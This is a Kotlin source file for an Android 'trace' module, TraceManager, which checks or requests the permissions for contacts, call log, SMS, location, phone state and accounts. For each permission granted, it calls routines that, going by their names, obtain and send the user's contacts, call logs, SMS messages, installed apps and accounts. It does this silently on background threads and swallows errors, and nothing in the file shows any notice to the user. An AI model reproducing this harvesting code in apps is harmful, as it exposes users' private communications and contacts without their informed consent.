package com.x.leo.apphelper.trace

import android.Manifest
import android.app.Activity
import android.content.pm.PackageManager
import android.os.Build
import android.os.Looper
import com.tbruyelle.rxpermissions.RxPermissions
import com.x.leo.apphelper.log.xlog.XLog
import com.x.leo.apphelper.utils.ThreadPoolManager
import org.json.JSONArray
import org.json.JSONObject
import rx.Subscriber
import rx.android.schedulers.AndroidSchedulers
import rx.schedulers.Schedulers
import java.util.*

/**
 * @作者:XLEO
 * @创建日期: 2017/9/4 14:46
 * @描述:上传策略
 *
 * @更新者:${Author}$
 * @更新时间:${Date}$
 * @更新描述:${TODO}
 * @下一步：
 */
object TraceManager {
    private val permissionsToCheck: Array<String> by lazy {
        arrayOf<String>(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_COARSE_LOCATION,//粗精度定位
                Manifest.permission.ACCESS_FINE_LOCATION,//卫星定位
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.GET_ACCOUNTS
        )
    }
    private val permissionsState: HashMap<String, PermissionState> by lazy {
        HashMap<String, PermissionState>()
    }

    private fun uploadInfo(act: Activity, permissions: String, func: (act: Activity, it: String) -> Unit) {
        RxPermissions(act).request(permissions).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Subscriber<Boolean>() {
                    override fun onNext(t: Boolean?) {
                        if (t == null) {
                            updatePermissionState(permissions, PermissionState.UNKNOW)
                        } else if (t) {
                            func.invoke(act, permissions)
                            updatePermissionState(permissions, PermissionState.GRANTED)
                        } else {
                            updatePermissionState(permissions, PermissionState.REFUSED)
                        }
                    }

                    override fun onCompleted() {
                    }

                    override fun onError(e: Throwable?) {
                        updatePermissionState(permissions, PermissionState.UNKNOW)
                    }

                })

    }

    fun uploadInfo(act: Activity, permissions: String) {
        uploadInfo(act, permissions, fun(act, permission) {
            uploadDetailInfo(act, permission)
        })
    }

    fun updatePermissionState(permissions: String, i: PermissionState) {
        permissionsState.put(permissions, i)
    }

    fun uploadAll(act: Activity) {
        permissionsToCheck.forEach {
            checkAndUpload(act, it)
        }
        ThreadPoolManager.runWithThread(Runnable {
            sendPermissionInfo(act)
        })
        ThreadPoolManager.runWithThread(Runnable {
            sendMachineInfo(act)
        })
    }

    private fun checkAndUpload(act: Activity, it: String) {
        if (Build.VERSION.SDK_INT >= 23) {
            val checkSelfPermission = act.checkSelfPermission(it)
            when (checkSelfPermission) {
                PackageManager.PERMISSION_GRANTED -> {
                    ThreadPoolManager.runWithThread(Runnable {
                        uploadDetailInfo(act, it)
                    })
                    updatePermissionState(it, PermissionState.GRANTED)
                }
                PackageManager.PERMISSION_DENIED -> updatePermissionState(it, PermissionState.REFUSED)
                else -> updatePermissionState(it, PermissionState.UNKNOW)
            }
        } else {
            ThreadPoolManager.runWithThread(Runnable {
                uploadDetailInfo(act, it)
            })
        }
    }

    private fun sendMachineInfo(act: Activity) {
        try {
            if (Looper.getMainLooper() == Looper.myLooper()) {
                TraceSender.sendInfo(act, TraceInfoGenerator.getMachineType(act))
            } else {
                TraceSender.sendInfo(act, TraceInfoGenerator.getMachineType(act))
            }
        } catch (e: Exception) {

        }
    }

    private fun sendPermissionInfo(act: Activity) {
        try {
            if (Looper.getMainLooper() == Looper.myLooper()) {
                ThreadPoolManager.runWithThread(Runnable {
                    TraceSender.sendInfo(act, generatePermissionJson(act))
                })
            } else {
                TraceSender.sendInfo(act, generatePermissionJson(act))
            }
        } catch (e: Exception) {
            XLog.e("sendpermissioninfo error",e,100)
        }
    }

    private fun generatePermissionJson(act: Activity): JSONObject {
        val result = JSONObject()
        val array = JSONArray()
        permissionsState.iterator().forEach {
            val obj = JSONObject()
            obj.put("permissionType", it.key)
            obj.put("isGranted", it.value.name)
            obj.put("checkTime", System.currentTimeMillis())
            array.put(obj)
        }
        result.put("protocolName", ProtocolName.PERMISSION)
        result.put("protocolVersion", ProtocolVersion.V_1_0)
        val packageInfo = act.packageManager.getPackageInfo(act.packageName, 0)
        result.put("versionName", packageInfo.versionName)
        result.put("totalNumber", permissionsState.size)
        result.put("data", array)
        return result
    }

    /**
     *
     */
    private fun uploadDetailInfo(act: Activity, t: String) {
        //TraceInfoGenerator.registerObserver(act)
        if (Looper.getMainLooper() == Looper.myLooper()) {
            ThreadPoolManager.runWithThread(Runnable {
                sendMessage(act, t)
            })
        } else {
            sendMessage(act, t)
        }
    }

    private fun sendMessage(act: Activity, t: String) {
        try {
            when (t) {
                Manifest.permission.READ_CONTACTS -> {
                    TraceInfoGenerator.ObtainAndSendContact(act)
                }
                Manifest.permission.READ_CALL_LOG -> {
                    TraceInfoGenerator.ObtainAndSendCallLog(act)
                }
                Manifest.permission.READ_SMS -> {
                    TraceInfoGenerator.ObtainAndSendSms(act)
                }
                Manifest.permission.ACCESS_COARSE_LOCATION -> {
//                    act.startService(Intent(act, TraceService::class.java))
                }
                Manifest.permission.ACCESS_FINE_LOCATION -> {
//                    act.startService(Intent(act, TraceService::class.java))
                }
                Manifest.permission.READ_PHONE_STATE -> {
                    TraceInfoGenerator.ObtainAndSendInatallApp(act)
                }
                Manifest.permission.GET_ACCOUNTS -> {
                    TraceInfoGenerator.obtainAndSendAccounts(act)
                }
                else -> {
                    throw IllegalArgumentException("wrong permission to request : " + t)
                }
            }
        } catch (e: Exception) {
            XLog.e("Trace Manager",e,100)
        }
    }
}

enum class PermissionState {
    //may request again
    //stop request and  send
    //stop request and never send
    UNKNOW,
    GRANTED, REFUSED
}
